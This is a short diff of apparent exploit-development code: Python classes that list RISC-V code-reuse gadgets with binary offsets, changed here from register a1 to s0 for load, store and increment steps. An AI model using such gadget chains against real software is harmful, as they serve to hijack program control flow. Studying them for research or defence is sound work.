@@ -66,32 +66,47 @@ class MoveA3(Gadget):
     def __init__(self):
         super().__init__(0x2a1f4)
 
-class LoadA1(Gadget):
+class LoadS0(Gadget):
     '''
-    lw a1, 0x54(a3)
-    lw a0, 0x5c(a3)
-    addi s1, sp, 0x34c
-    addi a3, sp, 0x1ec
-    jal	a4, 0x30(s0)
+    fld	fs0, 0x60(a3)
+    addi a5, sp, 0x8
+    li a4, 0
+    li a7, 0
+    li a6, 0
+    mv a3, s3
+    addi a2, sp, 0x10
+    addi a1, s0, 0x50
+    mv a0, s5
+    jalr s4
     '''
     def __init__(self):
-        super().__init__(0x1862b)
+        super().__init__(0x16ede)
 
-class StoreA1(Gadget):
+class StoreS0(Gadget):
     '''
-    fsd fa1, 0x48(a3)
-    jalr sp, -0x794(a5)
+    fsd	fs0, 0x28(a3)
+    bnez a1, 0xae
+    lw s9, 0x18(sp)
+    jalr tp, 0x6d6(s8)
     '''
     def __init__(self):
-        super().__init__(0x22b3d)
+        super().__init__(0x68da6)
 
-class IncrementA1(Gadget):
+class IncrementS0(Gadget):
     '''
-    addi a1, s0, 0x10
-    jalr s3
+    add	s0, s0, s11
+    li a7, 1
+    li a6, 0
+    mv a5, s5
+    li a4, 0
+    mv a3, s0
+    mv a2, s4
+    mv a1, s3
+    mv a0, s2
+    jalr s1
     '''
     def __init__(self):
-        super().__init__(0x2395e)
+        super().__init__(0x209ea)
 
 class InitializeA2(Gadget):
     '''
